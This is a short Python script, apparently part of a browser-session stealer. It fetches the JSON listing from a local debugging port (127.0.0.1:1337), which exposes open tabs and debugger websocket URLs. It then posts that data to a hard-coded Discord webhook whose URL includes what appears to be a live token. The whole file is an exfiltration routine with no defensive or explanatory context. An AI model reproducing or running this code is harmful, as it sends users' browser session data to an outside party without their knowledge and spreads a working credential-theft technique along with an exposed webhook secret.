import requests

webh = "https://discord.com/api/webhooks/1037072536644628591/vB8xwfa9bhr_904E79HmwWrN4bH_N6HVl3KpLYncaqBoEGLfjYQ-qh4pNrnAlBxukK4_"
url = "http://127.0.0.1:1337/json"


getws = requests.get(url)
lul = getws.json()
form = {'content': f'{lul}'}
sendtow = requests.post(webh, data=form)
